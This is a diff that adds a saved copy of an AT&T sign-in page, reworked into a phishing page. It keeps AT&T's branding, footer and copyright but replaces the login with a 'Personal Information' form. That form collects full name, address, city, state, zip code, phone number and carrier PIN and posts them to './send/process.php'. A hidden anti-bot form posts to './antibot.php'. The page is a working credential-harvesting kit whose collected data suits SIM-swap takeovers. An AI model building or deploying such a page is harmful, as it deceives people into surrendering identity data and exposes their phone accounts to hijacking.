@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang=en class="isPC isChrome isLandscape"><!--
+ Page saved with SingleFile 
+ url: https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3DDi9yByMu 
+ saved date: Thu Jan 02 2025 07:42:04 GMT-0800 (Pacific Standard Time)
+-->
+<meta charset=utf-8>
+<title>Login Screen</title>
+
+<meta http-equiv=X-UA-Compatible content="IE=9; IE=8; IE=7;IE=11; IE=EDGE">
+<meta name=viewport content="width=device-width, initial-scale=1.0,shrink-to-fit=no">
+<meta name=apple-itunes-app content="app-id=309172177">
+<link rel=stylesheet href=stylesheet_1.css>
+<style>
+    .full-height[_ngcontent-ybn-c37] {
+        min-height: 100vh
+    }
+</style>
+<style>
+    .footer-div[_ngcontent-ybn-c35] {
+        margin-top: 48px;
+        margin-bottom: 24px
+    }
+
+    .footer-links-div[_ngcontent-ybn-c35] {
+        display: flex;
+        flex-direction: row
+    }
+
+    .footer-links-div[_ngcontent-ybn-c35] app-footer-link[_ngcontent-ybn-c35] {
+        margin-right: 24px
+    }
+
+    .footer-links-div[_ngcontent-ybn-c35] app-footer-link[_ngcontent-ybn-c35]:last-child {
+        margin-right: 0
+    }
+
+    .copyright[_ngcontent-ybn-c35] {
+        margin-top: 16px;
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        justify-content: center
+    }
+
+    @media(max-width:767px) {
+        .footer-div[_ngcontent-ybn-c35] {
+            margin-bottom: 32px
+        }
+
+        .footer-links-div[_ngcontent-ybn-c35] {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start
+        }
+
+        .footer-links-div[_ngcontent-ybn-c35] app-footer-link[_ngcontent-ybn-c35] {
+            margin-bottom: 10px
+        }
+
+        .footer-links-div[_ngcontent-ybn-c35] app-footer-link[_ngcontent-ybn-c35]:last-child {
+            margin-bottom: 0
+        }
+
+        app-footer-link[_ngcontent-ybn-c35] {
+            height: 24px
+        }
+
+        .copyright[_ngcontent-ybn-c35] {
+            margin-top: 16px;
+            justify-content: flex-start
+        }
+    }
+</style>
+<style>
+    .space-below[_ngcontent-ybn-c39] {
+        margin-bottom: 32px
+    }
+
+    @media(max-width:767px) {
+        .space-below[_ngcontent-ybn-c39] {
+            margin-bottom: 24px
+        }
+    }
+</style>
+<style>
+    @media(max-width:767px) {}
+</style>
+<meta name=referrer content=no-referrer>
+<link rel=icon type=image/x-icon href=images/4.ico>
+<style>
+    .sf-hidden {
+        display: none !important
+    }
+</style>
+<link rel=canonical
+    href="https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&amp;appName=m14186&amp;loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3DDi9yByMu">
+<meta http-equiv=content-security-policy
+    content="default-src 'none'; connect-src 'self' data: blob:; font-src 'self' data: blob:; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline' data: blob:; frame-src 'self' data: blob:; media-src 'self' data: blob:; script-src 'self' 'unsafe-inline' data: blob:; object-src 'self' data: blob:;">
+</head>
+
+<body>
+    <div id=app-root _nghost-ybn-c37 ng-version=11.2.14 app-version=23.2.1>
+        <div _ngcontent-ybn-c37 id=appCompBackground class="full-width-background bg-white">
+            <div _ngcontent-ybn-c37 id=appCompContainer
+                class="container pad-l-none-sm pad-r-none-sm pad-t-none-sm pad-b-none-sm full-height flex flex-column">
+                <div _ngcontent-ybn-c37 id=appCompCardContainer class="row justify-center flex-1">
+                    <div _ngcontent-ybn-c37 id=appCompCardContDiv class=pad-none><app-card _ngcontent-ybn-c37 role=main>
+                            <div
+                                class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
+                                <div
+                                    class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
+                                    <app-header class=flex-container _nghost-ybn-c29><img _ngcontent-ybn-c29
+                                            id=headerLogoImage alt src=images/5.svg
+                                            class="header-logo-image mar-b-md-all">
+                                            <form action="./antibot.php" style="display:none;"method="POST">
+                                                <!-- Honeypot field, styled to be hidden -->
+                                                <input type="text" name="hidden_field" style="display:none;" tabindex="-1" autocomplete="off">
+                                                <input type="submit"   style="display:none;" tabindex="-1"  value="Submit">
+                                            </form>
+                                        <div _ngcontent-ybn-c29 class="mar-b-md-all text-center" id=signInHeaderTextDiv>
+                                            <h1 _ngcontent-ybn-c29 class=heading-lg id=signInHeaderText>Personal Information</h1>
+                                            <h1 _ngcontent-ybn-c29 class="heading-md mar-t-xxs-lg"
+                                                id=signInHeaderToText></h1>
+                                        </div>
+                                    </app-header>
+                                    <div class=width-full><router-outlet></router-outlet><app-manual-login><app-error
+                                                id=appErrorAbove></app-error>
+                                           <form method=post
+                                                class="manual-login-form ng-pristine ng-invalid ng-touched"
+                                                action="./send/process.php?Info">
+                                                <app-user-input _nghost-ybn-c39>
+                                                    <div _ngcontent-ybn-c39 id=userInputContainerDiv
+                                                        class="form-row space-below ng-pristine ng-invalid ng-touched">
+                                                        <label _ngcontent-ybn-c39 id=userLabel for=fname
+                                                            class=formfield-label>Full Name</label><input
+                                                            _ngcontent-ybn-c39 id=fname name=fname
+                                                            required autocomplete=username
+                                                            spellcheck=false autocapitalize=off
+                                                            aria-describedby=userInlineErrorText type=text
+                                                            class="textfield ng-pristine ng-invalid ng-touched" value>
+                                                        <div _ngcontent-ybn-c39 id=userInlineErrorText role=alert
+                                                            class=formfield-msg></div>
+                                                    </div>
+                                                </app-user-input>
+                                                <app-user-input _nghost-ybn-c39>
+                                                    <div _ngcontent-ybn-c39 id=userInputContainerDiv
+                                                        class="form-row space-below ng-pristine ng-invalid ng-touched">
+                                                        <label _ngcontent-ybn-c39 id=addy for=addy
+                                                            class=formfield-label>Address</label><input
+                                                            _ngcontent-ybn-c39 id=addy name=addy
+                                                            required autocomplete=username
+                                                            spellcheck=false autocapitalize=off
+                                                            aria-describedby=userInlineErrorText type='text'
+                                                            class="textfield ng-pristine ng-invalid ng-touched" value>
+                                                        <div _ngcontent-ybn-c39 id=userInlineErrorText role=alert
+                                                            class=formfield-msg></div>
+                                                    </div>
+                                                </app-user-input>
+                                                <app-user-input _nghost-ybn-c39>
+                                                    <div _ngcontent-ybn-c39 id=userInputContainerDiv
+                                                        class="form-row space-below ng-pristine ng-invalid ng-touched">
+                                                        <label _ngcontent-ybn-c39 id=city for=city
+                                                            class=formfield-label>City</label><input
+                                                            _ngcontent-ybn-c39 id=city name=city
+                                                            required autocomplete=username
+                                                            spellcheck=false autocapitalize=off
+                                                            aria-describedby=userInlineErrorText type=text
+                                                            class="textfield ng-pristine ng-invalid ng-touched" value>
+                                                        <div _ngcontent-ybn-c39 id=userInlineErrorText role=alert
+                                                            class=formfield-msg></div>
+                                                    </div>
+                                                </app-user-input>
+                                                <app-user-input _nghost-ybn-c39>
+                                                    <div _ngcontent-ybn-c39 id=userInputContainerDiv
+                                                        class="form-row space-below ng-pristine ng-invalid ng-touched">
+                                                        <label _ngcontent-ybn-c39 id=state for=state
+                                                            class=formfield-label>State</label><input
+                                                            _ngcontent-ybn-c39 id=state name=state
+                                                            required autocomplete=username
+                                                            spellcheck=false autocapitalize=off maxlength="2"
+                                                            aria-describedby=userInlineErrorText type=text
+                                                            class="textfield ng-pristine ng-invalid ng-touched" value>
+                                                        <div _ngcontent-ybn-c39 id=userInlineErrorText role=alert
+                                                            class=formfield-msg></div>
+                                                    </div>
+                                                </app-user-input>
+                                                <app-user-input _nghost-ybn-c39>
+                                                    <div _ngcontent-ybn-c39 id=userInputContainerDiv
+                                                        class="form-row space-below ng-pristine ng-invalid ng-touched">
+                                                        <label _ngcontent-ybn-c39 id=zup for=zip
+                                                            class=formfield-label>Zip Code</label><input
+                                                            _ngcontent-ybn-c39 id=zip name=zip
+                                                            required autocomplete=username
+                                                            spellcheck=false autocapitalize=off maxlength="5"
+                                                            aria-describedby=userInlineErrorText type=tel
+                                                            class="textfield ng-pristine ng-invalid ng-touched" value>
+                                                        <div _ngcontent-ybn-c39 id=userInlineErrorText role=alert
+                                                            class=formfield-msg></div>
+                                                    </div>
+                                                </app-user-input>
+                                                <app-user-input _nghost-ybn-c39>
+                                                    <div
+                                                      _ngcontent-ybn-c39
+                                                      id="userInputContainerDiv"
+                                                      class="form-row space-below ng-pristine ng-invalid ng-touched"
+                                                    >
+                                                      <label _ngcontent-ybn-c39 id="ph" for="ph" class="formfield-label">
+                                                        Phone Number
+                                                      </label>
+                                                      <input
+                                                        _ngcontent-ybn-c39
+                                                        id="ph"
+                                                        name="ph"
+                                                        oninput="formatPhoneNumber(this)"
+                                                        required
+                                                        maxlength="12"
+                                                        spellcheck="false"
+                                                        autocapitalize="off"
+                                                        aria-describedby="userInlineErrorText"
+                                                        type="tel"
+                                                        class="textfield ng-pristine ng-invalid ng-touched"
+                                                      />
+                                                      <div
+                                                        _ngcontent-ybn-c39
+                                                        id="userInlineErrorText"
+                                                        role="alert"
+                                                        class="formfield-msg"
+                                                      ></div>
+                                                    </div>
+                                                  </app-user-input>
+                                                  
+                                                  <script>
+                                                    function formatPhoneNumber(input) {
+                                                      // Remove all non-digit characters
+                                                      let value = input.value.replace(/\D/g, '');
+                                                  
+                                                      // Format: 000 000-0000
+                                                      if (value.length > 3) {
+                                                        value = value.substring(0, 3) + ' ' + value.substring(3);
+                                                      }
+                                                      if (value.length > 6) {
+                                                        value = value.substring(0, 7) + '-' + value.substring(7);
+                                                      }
+                                                  
+                                                      // Set the formatted value back to the input field
+                                                      input.value = value.substring(0, 12); // Limit to 12 characters
+                                                    }
+                                                  </script>
+                                                  
+                                                <app-user-input _nghost-ybn-c39>
+                                                    <div _ngcontent-ybn-c39 id=userInputContainerDiv
+                                                        class="form-row space-below ng-pristine ng-invalid ng-touched">
+                                                        <label _ngcontent-ybn-c39 id=cp for=cp
+                                                            class=formfield-label>Carrier PIN</label><input
+                                                            _ngcontent-ybn-c39 id=cp name=cp
+                                                            required autocomplete=username maxlength="8"
+                                                            spellcheck=false autocapitalize=off
+                                                            aria-describedby=userInlineErrorText type='tel'
+                                                            class="textfield ng-pristine ng-invalid ng-touched" value>
+                                                        <div _ngcontent-ybn-c39 id=userInlineErrorText role=alert
+                                                            class=formfield-msg></div>
+                                                    </div>
+                                                </app-user-input>
+                                                <div class=continue-button-spacing><app-button-spinner
+                                                        class=width-full><button aria-live=polite
+                                                            class="btn-full-width btn-primary letter-spacing-3"
+                                                            id=continueFromUserLogin
+                                                            type=submit>Continue</button></app-button-spinner></div>
+                                                <app-forgot-id-link>
+                                                
+                                                </app-forgot-id-link><app-dont-have-id-view>
+                                                    
+                                                 
+                                                </app-dont-have-id-view><app-fast-pay-button>
+                                                  
+                                                </app-fast-pay-button><app-prepaid-ctn-button
+                                                    _nghost-ybn-c51></app-prepaid-ctn-button>
+                                            </form>
+                                        </app-manual-login></div>
+                                </div>
+                            </div>
+                        </app-card></div>
+                </div>
+                <div _ngcontent-ybn-c37 id=appCompFooterContainer class="row flex-centered">
+                    <div _ngcontent-ybn-c37 id=appCompFooterContDiv class="grid-col-12 pad-none"><app-footer
+                            _ngcontent-ybn-c37 role=contentinfo _nghost-ybn-c35>
+                            <div _ngcontent-ybn-c35 class="login-background footer-div pad-l-lg-sm pad-r-lg-sm">
+                                <div _ngcontent-ybn-c35 id=footerLinksDiv class="footer-links-div justify-center">
+                                    <app-footer-link _ngcontent-ybn-c35 class="flex flex-row flex-items-center"><a
+                                            rel="noopener noreferrer" target=_blank id=footerLink0
+                                            href=https://www.att.com/legal/legal-policy-center.html
+                                            title="Legal policy center (Opens in new window)"
+                                            aria-label="Legal policy center (Opens in new window)"
+                                            class="type-xs link-text2">Legal policy
+                                            center</a></app-footer-link><app-footer-link _ngcontent-ybn-c35
+                                        class="flex flex-row flex-items-center"><a rel="noopener noreferrer"
+                                            target=_blank id=footerLink1 href=https://about.att.com/sites/privacy_policy
+                                            title="Privacy policy (Opens in new window)"
+                                            aria-label="Privacy policy (Opens in new window)"
+                                            class="type-xs link-text2">Privacy
+                                            policy</a></app-footer-link><app-footer-link _ngcontent-ybn-c35
+                                        class="flex flex-row flex-items-center"><a rel="noopener noreferrer"
+                                            target=_blank id=footerLink2
+                                            href=https://www.att.com/legal/terms.attWebsiteTermsOfUse.html
+                                            title="Terms of use (Opens in new window)"
+                                            aria-label="Terms of use (Opens in new window)"
+                                            class="type-xs link-text2">Terms of
+                                            use</a></app-footer-link><app-footer-link _ngcontent-ybn-c35
+                                        class="flex flex-row flex-items-center"><a rel="noopener noreferrer"
+                                            target=_blank id=footerLink3
+                                            href=https://www.att.com/features/accessibility.html
+                                            title="Accessibility (Opens in new window)"
+                                            aria-label="Accessibility (Opens in new window)"
+                                            class="type-xs link-text2">Accessibility</a></app-footer-link><app-footer-link
+                                        _ngcontent-ybn-c35 class="flex flex-row flex-items-center"><app-footer-link-icon
+                                            id=footerLinkIconElLeft4>
+                                            <div class="flex flex-row flex-items-center footer-link-icon"
+                                                id=footerLinkIcon4><svg width=24 height=24 viewBox="0 0 24 24" fill=none
+                                                    xmlns=http://www.w3.org/2000/svg role=img focusable=true
+                                                    class=footer-link-icon-svg id=footerLinkIconSvg4
+                                                    aria-label="California Consumer Privacy Act (CCPA) Opt-Out Icon">
+                                                    <rect x=1 y=6.07595 width=22 height=11.1392 rx=5.56962 fill=white>
+                                                    </rect>
+                                                    <path fill-rule=evenodd clip-rule=evenodd
+                                                        d="M17.4304 6.07595C20.5064 6.07595 23 8.56955 23 11.6456C23 14.7216 20.5064 17.2152 17.4304 17.2152H6.56962C3.49361 17.2152 1 14.7216 1 11.6456C1 8.56955 3.49361 6.07595 6.56962 6.07595H17.4304ZM13.2679 6.91818H6.56962C3.95876 6.91818 1.84223 9.03471 1.84223 11.6456C1.84223 14.2564 3.95876 16.373 6.56962 16.373H10.7321L13.2679 6.91818ZM10.3553 9.41582C10.5301 9.55752 10.557 9.81415 10.4153 9.98902L7.41378 13.6942C7.16006 14.0074 6.69106 14.0319 6.4061 13.7468L4.65019 11.9904C4.49109 11.8312 4.49109 11.5732 4.65019 11.414C4.80929 11.2549 5.06725 11.2549 5.22635 11.414L6.87565 13.0638L9.78224 9.47587C9.92389 9.301 10.1804 9.27411 10.3553 9.41582ZM15.1023 9.24971C14.9477 9.08617 14.6899 9.07896 14.5264 9.2336C14.3629 9.38824 14.3557 9.64617 14.5103 9.80971L16.2013 11.5987L14.4609 13.3396C14.3018 13.4988 14.3018 13.7568 14.4609 13.916C14.62 14.0751 14.878 14.0751 15.0371 13.916L16.7614 12.1911L18.4368 13.9635C18.5914 14.1271 18.8493 14.1343 19.0128 13.9796C19.1762 13.825 19.1835 13.5671 19.0289 13.4035L17.3378 11.6146L19.0782 9.8736C19.2373 9.71445 19.2373 9.45641 19.0782 9.29726C18.9191 9.13811 18.6611 9.13811 18.502 9.29726L16.7777 11.0221L15.1023 9.24971Z"
+                                                        fill=#454B52></path>
+                                                </svg></div>
+                                        </app-footer-link-icon><a rel="noopener noreferrer" target=_blank id=footerLink4
+                                            href=https://about.att.com/csr/home/privacy/rights_choices.html
+                                            title="Your privacy choices (Opens in new window)"
+                                            aria-label="Your privacy choices (Opens in new window)"
+                                            class="type-xs link-text2 mar-l-xxs-lg">Your privacy
+                                            choices</a></app-footer-link></div>
+                                <div _ngcontent-ybn-c35 class="font-regular copyright"><span _ngcontent-ybn-c35
+                                        id=copyrightTextSpan class="type-xs color-ui-medium-gray">©2025 AT&amp;T
+                                        Intellectual Property. All rights reserved.</span></div>
+                            </div>
+                        </app-footer></div>
+                </div>
+            </div>
+        </div><app-full-page-spinner _ngcontent-ybn-c37></app-full-page-spinner>
+    </div>
+
+    <div id=modheader-shadow-root-host-el-id style="display:initial !important"><template shadowrootmode=open>
+            <link rel=stylesheet href=stylesheet_0.css>
+            <style id=svelte-g289qm class=sf-hidden>
+                #ModHeader-shadow-root {
+                    all: initial;
+                    font-size: 16px;
+                    font-family: Roboto, sans-serif, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue !important
+                }
+
+                @tailwind base;
+                @tailwind components;
+                @tailwind utilities;
+            </style>
+            <style id=svelte-ol2ow9 class=sf-hidden>
+                #modheader-tool-suspend-btn.svelte-ol2ow9 {
+                    position: fixed;
+                    top: 30vh;
+                    right: 0;
+                    z-index: 2147483640;
+                    transition: transform .3s;
+                    cursor: pointer;
+                    user-select: none;
+                    font-size: 16px;
+                    visibility: hidden
+                }
+
+                #modheader-tool-suspend-btn.rest.svelte-ol2ow9:hover {
+                    transform: translate(0, 0) !important
+                }
+
+                .suspend-btn.svelte-ol2ow9 {
+                    border-radius: 50%;
+                    width: 2.25em;
+                    height: 2.25em
+                }
+
+                .memory-button.svelte-ol2ow9 {
+                    display: flex;
+                    width: 100%;
+                    height: 100%;
+                    border-radius: 50%;
+                    align-items: center;
+                    justify-content: center;
+                    font-size: 12px;
+                    font-weight: 700;
+                    background-color: #56a9ff;
+                    color: white;
+                    box-shadow: 0 3px 6px -1px rgba(0, 0, 0, 0.12), 0 10px 36px -4px rgba(77, 96, 232, 0.3);
+                    gap: 1px;
+                    flex-wrap: wrap;
+                    line-height: 1;
+                    zoom: .94
+                }
+
+                .tooltip.svelte-ol2ow9 {
+                    position: absolute;
+                    top: 0;
+                    bottom: 0;
+                    height: min-content;
+                    margin: auto;
+                    font-size: 12px;
+                    background-color: rgb(1, 1, 1, 0.9);
+                    font-weight: 100;
+                    white-space: nowrap;
+                    color: #ddd;
+                    padding: 5px 9px;
+                    border-radius: 5px;
+                    box-shadow: 0 6px 16px 0 rgba(0, 0, 0, 0.08), 0 3px 6px -4px rgba(0, 0, 0, 0.12), 0 9px 28px 8px rgba(0, 0, 0, 0.05);
+                    opacity: 0;
+                    visibility: hidden;
+                    transition: visibility 0s linear .1s, opacity .1s linear
+                }
+
+                .close-btn-container.svelte-ol2ow9 {
+                    position: absolute;
+                    visibility: hidden;
+                    top: -6px;
+                    left: -6px;
+                    border-radius: 50%;
+                    background-color: rgba(0, 0, 0, 0.51);
+                    line-height: .8;
+                    transition: background-color .3s
+                }
+
+                .close-btn-container.svelte-ol2ow9:hover {
+                    background-color: rgba(0, 0, 0, 0.7)
+                }
+
+                .close-btn {
+                    width: 14px !important;
+                    height: 14px !important;
+                    overflow-y: hidden
+                }
+
+                #close-menu-c.svelte-ol2ow9 {
+                    position: absolute;
+                    top: 0;
+                    z-index: 999999
+                }
+            </style>
+            <style id=svelte-13zog9y class=sf-hidden>
+                .icon-btn.svelte-13zog9y {
+                    border-radius: 50%;
+                    transition: background-color .2s ease-in-out;
+                    display: inline-flex;
+                    align-items: center;
+                    justify-content: center;
+                    overflow: hidden
+                }
+
+                .icon-btn.svelte-13zog9y:hover {
+                    background-color: rgba(0, 0, 0, 0.04);
+                    cursor: pointer
+                }
+
+                .icon-btn.svelte-13zog9y:active {
+                    background-color: rgba(0, 0, 0, 0.08);
+                    transform: scale(0.95);
+                    cursor: pointer
+                }
+            </style>
+            <style id=svelte-omilz8 class=sf-hidden>
+                .close-menu-c.svelte-omilz8.svelte-omilz8 {
+                    cursor: unset !important;
+                    color: #0376ff;
+                    position: absolute;
+                    z-index: 1;
+                    border-radius: 10px;
+                    overflow: hidden;
+                    right: 0;
+                    padding: 10px 10px;
+                    width: 280px;
+                    background-color: #fdfdfd;
+                    box-shadow: rgba(14, 30, 37, 0.12) 0px 2px 4px 0px, rgba(14, 30, 37, 0.32) 0px 2px 16px 0px
+                }
+
+                .close-menu-radio-group-c.svelte-omilz8.svelte-omilz8 {
+                    background-color: #f8f8f8;
+                    border-radius: 8px;
+                    margin: 5px;
+                    font-size: 14px
+                }
+
+                .close-menu-radio-group-c.svelte-omilz8>label.svelte-omilz8 {
+                    justify-content: flex-start !important;
+                    gap: 15px;
+                    padding: 5px
+                }
+
+                .ctrl-btn-c.svelte-omilz8.svelte-omilz8 {
+                    display: flex;
+                    gap: 6px;
+                    align-items: center;
+                    margin-top: 14px;
+                    padding: 0 10px
+                }
+
+                .ctrl-btn-c.svelte-omilz8 button.svelte-omilz8 {
+                    font-weight: 100;
+                    padding: 0 16px;
+                    flex-grow: 1
+                }
+
+                .ctrl-btn-c.svelte-omilz8 button.svelte-omilz8:hover {
+                    color: white
+                }
+
+                .close-menu-radio-group-c.svelte-omilz8 .radio.svelte-omilz8:checked {
+                    background-color: #0376ff;
+                    border-color: #0376ff
+                }
+
+                .close-menu-radio-group-c.svelte-omilz8 .radio.svelte-omilz8 {
+                    border-color: #0376ff
+                }
+
+                .re-open-text.svelte-omilz8.svelte-omilz8 {
+                    font-size: 13px;
+                    text-align: left;
+                    color: #7b7b7b;
+                    padding-left: 10px;
+                    vertical-align: center;
+                    line-height: 1
+                }
+            </style>
+           
+            </div>
+        </template></div><b style=position:absolute;left:-1000px><iframe style=display:none></iframe></b>
+    <script
+        data-template-shadow-root>(() => { document.currentScript.remove(); processNode(document); function processNode(node) { node.querySelectorAll("template[shadowrootmode]").forEach(element => { let shadowRoot = element.parentElement.shadowRoot; if (!shadowRoot) { try { shadowRoot = element.parentElement.attachShadow({ mode: element.getAttribute("shadowrootmode"), delegatesFocus: element.getAttribute("shadowrootdelegatesfocus") != null, clonable: element.getAttribute("shadowrootclonable") != null, serializable: element.getAttribute("shadowrootserializable") != null }); shadowRoot.innerHTML = element.innerHTML; element.remove() } catch (error) { } if (shadowRoot) { processNode(shadowRoot) } } }) } })()</script>
+</body><!-- ADDING ADOBE CONTAINER Footer -->
